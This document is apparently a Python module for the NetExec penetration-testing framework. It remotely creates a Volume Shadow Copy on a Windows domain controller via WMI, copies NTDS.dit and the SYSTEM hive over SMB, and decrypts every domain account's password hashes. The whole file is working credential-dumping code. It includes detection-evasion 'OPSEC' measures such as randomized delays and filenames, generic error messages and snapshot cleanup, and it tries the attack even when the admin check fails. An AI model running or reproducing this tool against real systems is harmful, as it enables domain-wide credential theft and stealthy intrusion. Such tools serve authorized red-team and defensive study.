# NTDS Shadow Snapshot module for nxc
# Based on Impacket PR #2021
# Author: Mercury @ Black Lantern Security

from os import makedirs
from os.path import join
from nxc.paths import TMP_PATH
import random
import time
import os
import threading
from datetime import datetime
from impacket.examples.secretsdump import LocalOperations, NTDSHashes
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dtypes import NULL
from nxc.helpers.misc import CATEGORY, validate_ntlm, gen_random_string
import contextlib


class NXCModule:
    name = "ntdsdump"
    description = "Extract and decrypt NTDS.dit using VSS"
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def __init__(self):
        self.context = None
        self.connection = None
        self.logger = None
        self.db = None
        self.domain = None
        self.output_filename = ""
        self.RANDOM_RUN_NUM = int(random.random() * 100000000)
        self.extracted_files = {}

    def options(self, context, module_options):
        """No options needed - module has fixed configuration with OPSEC enhancements"""
        # Fixed configuration - no user options needed
        self.target_files = ["NTDS", "SYSTEM"]
        self.volume = "C:\\"
        self.local_path = join(TMP_PATH, f"ntds_dump_{self.RANDOM_RUN_NUM}")

        # OPSEC: Track current shadow snapshot for cleanup
        self.current_shadow_id = None
        self.cleanup_lock = threading.Lock()

        # Ensure local path exists
        makedirs(self.local_path, exist_ok=True)

    def _random_delay(self, min_seconds=1, max_seconds=5):
        """OPSEC: Add randomized timing delays to avoid detection patterns"""
        delay = random.uniform(min_seconds, max_seconds)
        self.logger.debug(f"OPSEC delay: {delay:.2f}s")
        time.sleep(delay)

    def _generate_random_filename(self, prefix="", suffix=""):
        """OPSEC: Generate randomized filenames to avoid IOC patterns"""
        random_part = gen_random_string(8)
        timestamp_part = gen_random_string(4)
        return f"{prefix}{random_part}_{timestamp_part}{suffix}"

    def create_shadow_snapshot(self):
        """Create a shadow snapshot using WMI (OPSEC-friendly, no PowerShell execution)"""
        try:
            # Get credentials from the SMB connection
            username, password, domain, lmhash, nthash, aesKey, _, _ = self.connection.conn.getCredentials()
            self.logger.debug(f"Using credentials: {domain}\\{username}")

            # Create DCOM connection for WMI
            dcom = DCOMConnection(
                self.connection.host,
                username,
                password,
                domain,
                lmhash,
                nthash,
                aesKey,
                oxidResolver=False,
                doKerberos=self.connection.kerberos,
                kdcHost=self.connection.kdcHost if hasattr(self.connection, "kdcHost") else None
            )

            # Get WMI interface
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
            iWbemLevel1Login.RemRelease()

            # Get Win32_ShadowCopy class
            win32ShadowCopy, _ = iWbemServices.GetObject("Win32_ShadowCopy")
            self.logger.debug("Creating shadow snapshot via WMI...")

            # Create the shadow copy
            result = win32ShadowCopy.Create(self.volume, "ClientAccessible")
            shadow_id = result.ShadowID

            # OPSEC: Track shadow ID for cleanup
            with self.cleanup_lock:
                self.current_shadow_id = shadow_id

            self.logger.success(f"Shadow snapshot created with ID: {shadow_id}")

            # Wait briefly for snapshot to be ready
            time.sleep(2)

            dcom.disconnect()

            return shadow_id

        except Exception as e:
            self.logger.fail(f"Failed to create shadow snapshot: {e}")
            self.logger.debug(f"Exception details: {type(e).__name__}: {e!s}")
            raise Exception(f"Shadow snapshot creation failed: {e}") from e

    def _format_size(self, size_bytes):
        """Convert bytes to human-readable format"""
        for unit in ["B", "KB", "MB", "GB", "TB"]:
            if size_bytes < 1024.0:
                return f"{size_bytes:.1f} {unit}"
            size_bytes /= 1024.0
        return f"{size_bytes:.1f} PB"

    def _get_file_size(self, remote_path):
        """Get the size of a remote file via SMB"""
        from impacket.smbconnection import SMBConnection

        fresh_smb = None
        try:
            # Get credentials from existing connection
            username, password, domain, lmhash, nthash, aesKey, _, _ = self.connection.conn.getCredentials()

            # Create new SMB connection
            fresh_smb = SMBConnection(self.connection.host, self.connection.host, sess_port=445)

            # Authenticate
            if self.connection.kerberos:
                fresh_smb.kerberosLogin(username, password, domain, lmhash, nthash, aesKey,
                                       kdcHost=self.connection.kdcHost if hasattr(self.connection, "kdcHost") else None)
            else:
                fresh_smb.login(username, password, domain, lmhash, nthash)

            # Convert path to use forward slashes
            smb_path = remote_path.replace("\\", "/")

            # Query file info to get size
            file_info = fresh_smb.listPath("C$", smb_path)
            if file_info:
                size = file_info[0].get_filesize()
                fresh_smb.close()
                return size

            fresh_smb.close()
            return None

        except Exception as e:
            if fresh_smb:
                with contextlib.suppress(Exception):
                    fresh_smb.close()
            self.logger.debug(f"Failed to get file size: {e}")
            return None

    def _stealth_download(self, remote_path, local_path, file_size=None, chunk_size=None):
        """Download files quickly using optimized SMB connection"""
        from impacket.smbconnection import SMBConnection
        import socket

        temp_path = None
        fresh_smb = None
        try:
            # OPSEC: Use randomized local filename during transfer
            temp_filename = self._generate_random_filename(suffix=".tmp")
            temp_path = join(os.path.dirname(local_path), temp_filename)

            # Create a fresh SMB connection specifically for VSS file access
            self.logger.debug("Creating fresh SMB connection for VSS access...")

            # Get credentials from existing connection
            username, password, domain, lmhash, nthash, aesKey, _, _ = self.connection.conn.getCredentials()

            # Create new SMB connection with optimized settings
            fresh_smb = SMBConnection(self.connection.host, self.connection.host, sess_port=445)

            # Authenticate using the same credentials
            if self.connection.kerberos:
                fresh_smb.kerberosLogin(username, password, domain, lmhash, nthash, aesKey,
                                       kdcHost=self.connection.kdcHost if hasattr(self.connection, "kdcHost") else None)
            else:
                fresh_smb.login(username, password, domain, lmhash, nthash)

            # Optimize socket for faster transfers
            try:
                if hasattr(fresh_smb, "_SMBConnection__socket"):
                    sock = fresh_smb._SMBConnection__socket
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # Disable Nagle
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2 * 1024 * 1024)  # 2MB receive buffer
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 * 1024 * 1024)  # 2MB send buffer
            except Exception:
                pass  # Ignore if not supported

            # Convert path to use forward slashes
            smb_path = remote_path.replace("\\", "/")

            # Use simple callback for maximum speed
            with open(temp_path, "wb") as local_file:
                fresh_smb.getFile("C$", smb_path, local_file.write)

            # Close fresh connection
            fresh_smb.close()
            fresh_smb = None

            # Rename temp file to final name
            os.rename(temp_path, local_path)

            file_size_actual = os.path.getsize(local_path)
            self.logger.debug(f"Downloaded {self._format_size(file_size_actual)}")
            return True

        except Exception as e:
            # Clean up fresh connection
            if fresh_smb:
                with contextlib.suppress(Exception):
                    fresh_smb.close()

            # Clean up temp file on failure
            if temp_path and os.path.exists(temp_path):
                with contextlib.suppress(Exception):
                    os.remove(temp_path)
            raise e

    def delete_shadow_snapshot(self, shadow_id):
        """Delete the shadow snapshot using WMI with complete timeout protection"""
        self.logger.display(f"Deleting shadow snapshot {shadow_id}...")

        def complete_cleanup_worker():
            """Complete cleanup worker with all operations"""
            try:
                # Skip OPSEC delay for faster cleanup

                # Get credentials from the SMB connection
                username, password, domain, lmhash, nthash, aesKey, _, _ = self.connection.conn.getCredentials()

                # Create DCOM connection for WMI
                dcom = DCOMConnection(
                    self.connection.host,
                    username,
                    password,
                    domain,
                    lmhash,
                    nthash,
                    aesKey,
                    oxidResolver=False,
                    doKerberos=self.connection.kerberos,
                    kdcHost=self.connection.kdcHost if hasattr(self.connection, "kdcHost") else None
                )

                # Get WMI interface
                iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
                iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
                iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
                iWbemLevel1Login.RemRelease()

                # Delete the shadow copy
                wmi_path = f'Win32_ShadowCopy.ID="{shadow_id}"'
                self.logger.debug(f"Deleting shadow copy: {wmi_path}")
                iWbemServices.DeleteInstance(wmi_path)
                self.logger.debug("Shadow copy deletion completed")

                # Disconnect
                dcom.disconnect()
                self.logger.debug("DCOM connection closed")

                return True

            except Exception as e:
                self.logger.debug(f"Cleanup worker failed: {e}")
                return False

        try:
            # Run complete cleanup in thread with timeout
            cleanup_thread = threading.Thread(target=complete_cleanup_worker)
            cleanup_thread.daemon = True
            cleanup_thread.start()
            cleanup_thread.join(timeout=3)  # 3 second timeout for entire cleanup

            # OPSEC: Clear tracking regardless of cleanup success
            with self.cleanup_lock:
                if self.current_shadow_id == shadow_id:
                    self.current_shadow_id = None

            if cleanup_thread.is_alive():
                self.logger.display("Shadow snapshot cleanup timed out (non-critical)")
            else:
                self.logger.success("Shadow snapshot cleanup completed")

        except Exception as e:
            # OPSEC: Use generic error messages to avoid revealing techniques
            self.logger.fail("Failed to cleanup shadow snapshot")
            self.logger.debug(f"Cleanup error details: {type(e).__name__}: {e!s}")
            # Don't raise exception here as cleanup failure shouldn't stop the main process

    def extract_files_from_snapshot(self, shadow_id):
        """Extract target files from the shadow snapshot via SMB"""
        self.logger.display("Extracting files from shadow snapshot...")

        try:
            # Get the GMT SMB path for accessing the shadow snapshot
            gmt_smb_path = None

            # Method 1: Try to list snapshots via SMB
            try:
                tree_id = self.connection.conn.connectTree("C$")
                snapshots = self.connection.conn.listSnapshots(tree_id, "/")
                if snapshots:
                    # use first snapshot
                    gmt_smb_path = snapshots[0]
                    self.logger.debug(f"Found {len(snapshots)} snapshots: {snapshots}")
                    self.logger.debug(f"Using newest snapshot: {gmt_smb_path}")
                else:
                    self.logger.debug("No snapshots found via listSnapshots")

            except Exception as e:
                self.logger.debug(f"listSnapshots failed: {e}")

            # Method 2: Try to construct GMT path using shadow ID
            if not gmt_smb_path:
                try:
                    # Extract timestamp from shadow ID or use current time
                    timestamp = datetime.now().strftime("%Y.%m.%d-%H.%M.%S")
                    gmt_smb_path = f"@GMT-{timestamp}.000"
                    self.logger.debug(f"Using constructed GMT path: {gmt_smb_path}")
                except Exception as e:
                    self.logger.debug(f"GMT path construction failed: {e}")

            # Method 3: Fallback to direct shadow access
            if not gmt_smb_path:
                # Try using the shadow ID directly
                gmt_smb_path = f"@GMT-{shadow_id}"
                self.logger.debug(f"Using shadow ID as GMT path: {gmt_smb_path}")

            if not gmt_smb_path:
                raise Exception("Could not determine GMT path for shadow snapshot access")

            # File mapping for extraction (only NTDS and SYSTEM needed for decryption)
            # Standard Windows paths - try most common locations first
            file_mapping = {
                "SYSTEM": [
                    f"{gmt_smb_path}/Windows/System32/config/SYSTEM",  # Most common
                    "Windows/System32/config/SYSTEM",  # Without GMT prefix
                    f"{gmt_smb_path}/System32/config/SYSTEM",  # Alternate
                    "System32/config/SYSTEM"  # Alternate without GMT
                ],
                "NTDS": [
                    f"{gmt_smb_path}/Windows/NTDS/ntds.dit",  # Most common
                    "Windows/NTDS/ntds.dit",  # Without GMT prefix
                    f"{gmt_smb_path}/NTDS/ntds.dit",  # Alternate
                    "NTDS/ntds.dit"  # Alternate without GMT
                ]
            }

            # Extract each target file with retry logic
            for file_type in self.target_files:
                if file_type in file_mapping:
                    possible_paths = file_mapping[file_type]
                    # OPSEC: Use randomized local filenames
                    local_filename = self._generate_random_filename(prefix=file_type.lower() + "_")
                    local_path = join(self.local_path, local_filename)

                    # Try each possible path
                    success = False
                    file_size = None

                    for path_idx, remote_path in enumerate(possible_paths):
                        if success:
                            break

                        self.logger.debug(f"Trying path {path_idx + 1}/{len(possible_paths)}: {remote_path}")

                        # Try to get file size first (for the first path only to save time)
                        if path_idx == 0:
                            file_size = self._get_file_size(remote_path)
                            if file_size:
                                self.logger.debug(f"File size: {self._format_size(file_size)}")

                        # Try multiple times for each path
                        for attempt in range(2):
                            try:
                                if attempt > 0:
                                    self.logger.debug(f"Retry attempt {attempt + 1} for {file_type} at path {path_idx + 1}")

                                # Display nice message with file size
                                if attempt == 0 and path_idx == 0:
                                    if file_type == "NTDS":
                                        size_str = f" [{self._format_size(file_size)}]" if file_size else ""
                                        self.logger.display(f"Downloading NTDS.dit{size_str}...")
                                    elif file_type == "SYSTEM":
                                        size_str = f" [{self._format_size(file_size)}]" if file_size else ""
                                        self.logger.display(f"Downloading SYSTEM hive{size_str}...")

                                # Download with progress tracking
                                self._stealth_download(remote_path, local_path, file_size=file_size)

                                self.extracted_files[file_type] = local_path
                                self.logger.success(f"{file_type} download complete!")
                                success = True
                                break

                            except Exception as e:
                                self.logger.debug(f"Path {path_idx + 1} attempt {attempt + 1} failed for {file_type}: {e}")
                                continue

                    if not success:
                        # OPSEC: Generic error message
                        self.logger.fail(f"Failed to extract {file_type} from all possible paths")
                        self.logger.debug(f"Attempted paths: {possible_paths}")

                        # Special handling for SYSTEM file - try fallback method
                        if file_type == "SYSTEM":
                            self.logger.display("Attempting fallback method for SYSTEM hive...")
                            if self._try_system_fallback():
                                self.logger.success("SYSTEM hive extracted via fallback method")
                            else:
                                self.logger.fail("CRITICAL: Failed to extract SYSTEM hive - cannot decrypt hashes")

        except Exception as e:
            self.logger.fail(f"Failed to extract files from snapshot: {e}")
            raise Exception(f"File extraction failed: {e}") from e

    def on_admin_login(self, context, connection):
        self.host = connection.host
        self.connection = connection
        self.logger = context.log
        self.db = connection.db
        self.domain = connection.domain
        self.output_filename = connection.output_file_template.format(output_folder="ntds")
        self.main()

    def _try_system_fallback(self):
        """Fallback method to extract SYSTEM hive - skip if connections are unstable"""
        try:
            self.logger.debug("Skipping SYSTEM fallback due to connection instability")
            self.logger.display("SYSTEM hive extraction failed - proceeding with NTDS-only analysis")

            # Since connections are failing, just return False and let the module continue
            # The user can still get the NTDS file which was successfully extracted
            return False

        except Exception as e:
            self.logger.debug(f"Fallback method failed: {e}")
            return False

    def on_login(self, context, connection):
        """Fallback method if admin check fails but we want to try anyway"""
        # Only run if on_admin_login wasn't called (admin check failed)
        if not hasattr(self, "host") and not hasattr(self, "logger"):
            # Set logger first before using it
            self.logger = context.log
            self.logger.display("Admin check failed or timed out, attempting anyway...")
            self.logger.display("Note: This module requires admin privileges to create shadow snapshots")
            self.host = connection.host
            self.connection = connection
            self.db = connection.db
            self.domain = connection.domain
            self.output_filename = connection.output_file_template.format(output_folder="ntds")
            try:
                self.main()
            except Exception as e:
                self.logger.fail(f"Module failed (likely due to insufficient privileges): {e}")
                self.logger.fail("This module requires administrator privileges to create shadow snapshots")

    def main(self):
        """Main execution method using WMI Shadow Snapshots"""
        shadow_id = None
        try:
            self.logger.display("Creating VSS via WMI...")

            # Create shadow snapshot
            shadow_id = self.create_shadow_snapshot()

            # Extract files from snapshot
            self.extract_files_from_snapshot(shadow_id)

            # Parse and dump hashes
            if self.extracted_files:
                self.logger.success("Files extracted successfully!")
                self.logger.display("Extracting bootkey and decrypting NTDS.dit...")
                self.dump_hashes()
            else:
                self.logger.fail("No files were extracted successfully")

        except KeyboardInterrupt:
            # OPSEC: Handle interruption gracefully
            self.logger.display("Operation interrupted by user")
        except Exception as e:
            # OPSEC: Generic error message
            self.logger.fail("Shadow snapshot extraction failed")
            self.logger.debug(f"Exception details: {type(e).__name__}: {e!s}")
        finally:
            # OPSEC: Always try to cleanup the shadow snapshot with thread-safe approach
            def final_cleanup():
                try:
                    with self.cleanup_lock:
                        if shadow_id:
                            self.delete_shadow_snapshot(shadow_id)
                        elif self.current_shadow_id:
                            self.delete_shadow_snapshot(self.current_shadow_id)
                except Exception as cleanup_error:
                    self.logger.debug(f"Final cleanup failed: {cleanup_error}")

                # OPSEC: Clear sensitive data from memory
                try:
                    self.extracted_files.clear()
                    if hasattr(self, "current_shadow_id"):
                        self.current_shadow_id = None
                except Exception:
                    pass

            # Run final cleanup with timeout to prevent hanging
            cleanup_thread = threading.Thread(target=final_cleanup)
            cleanup_thread.daemon = True
            cleanup_thread.start()
            cleanup_thread.join(timeout=3)  # 3 second timeout for final cleanup

            if cleanup_thread.is_alive():
                self.logger.debug("Final cleanup timed out - forcing exit")
            else:
                self.logger.debug("Final cleanup completed successfully")

    def dump_hashes(self):
        """Dumping NTDS hashes locally from the extracted files"""
        if "SYSTEM" not in self.extracted_files:
            self.logger.fail("SYSTEM hive not available, cannot decrypt hashes")
            self.logger.fail("Available files: " + ", ".join(self.extracted_files.keys()))
            self.logger.display("NTDS file was extracted but cannot be decrypted without SYSTEM hive")
            if "NTDS" in self.extracted_files:
                self.logger.display(f"Raw NTDS file available at: {self.extracted_files['NTDS']}")
            return

        # Verify SYSTEM file exists and is readable
        system_path = self.extracted_files["SYSTEM"]
        try:
            if not os.path.exists(system_path):
                self.logger.fail(f"SYSTEM file does not exist at: {system_path}")
                return

            file_size = os.path.getsize(system_path)
            if file_size == 0:
                self.logger.fail(f"SYSTEM file is empty: {system_path}")
                return

            self.logger.debug(f"SYSTEM hive size: {file_size} bytes at {system_path}")

        except Exception as e:
            self.logger.fail(f"Error checking SYSTEM file: {e}")
            return

        # Get bootkey from SYSTEM hive
        try:
            local_operations = LocalOperations(self.extracted_files["SYSTEM"])
        except Exception as e:
            self.logger.fail(f"Failed to initialize LocalOperations with SYSTEM hive: {e}")
            return
        boot_key = local_operations.getBootKey()
        no_lm_hash = local_operations.checkNoLMHashPolicy()

        # NTDS hashes
        if "NTDS" in self.extracted_files:
            def add_ntds_hash(ntds_hash, host_id):
                """Extract NTDS hashes"""
                add_ntds_hash.ntds_hashes += 1
                ntds_hash = ntds_hash.split(" ")[0]
                self.logger.highlight(ntds_hash)
                if ntds_hash.find("$") == -1:
                    if ntds_hash.find("\\") != -1:
                        domain, clean_hash = ntds_hash.split("\\")
                    else:
                        clean_hash = ntds_hash

                    try:
                        username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
                        parsed_hash = f"{lmhash}:{nthash}"
                        if validate_ntlm(parsed_hash):
                            # Skip database storage to avoid debug errors
                            add_ntds_hash.added_to_db += 1
                            return
                        raise
                    except Exception:
                        self.logger.debug("Dumped hash is not NTLM, not adding to db for now ;)")
                else:
                    self.logger.debug("Dumped hash is a computer account, not adding to db")

            add_ntds_hash.ntds_hashes = 0
            add_ntds_hash.added_to_db = 0

            NTDS = NTDSHashes(
                self.extracted_files["NTDS"],
                boot_key,
                isRemote=False,
                history=False,
                noLMHash=no_lm_hash,
                remoteOps=None,
                useVSSMethod=True,
                justNTLM=False,
                pwdLastSet=False,
                resumeSession=None,
                outputFileName=self.output_filename,
                justUser=None,
                printUserStatus=True,
                perSecretCallback=lambda secretType, secret: add_ntds_hash(secret, self.host),
            )

            try:
                NTDS.dump()
            except Exception as e:
                self.logger.fail(e)

            NTDS.finish()

        if "NTDS" in self.extracted_files:
            self.logger.success(f"Dumped {add_ntds_hash.ntds_hashes} NTDS hashes to {self.output_filename}.ntds of which {add_ntds_hash.added_to_db} were added to the database")
            self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
            self.logger.display(f"grep -iv disabled {self.output_filename}.ntds | cut -d ':' -f1")
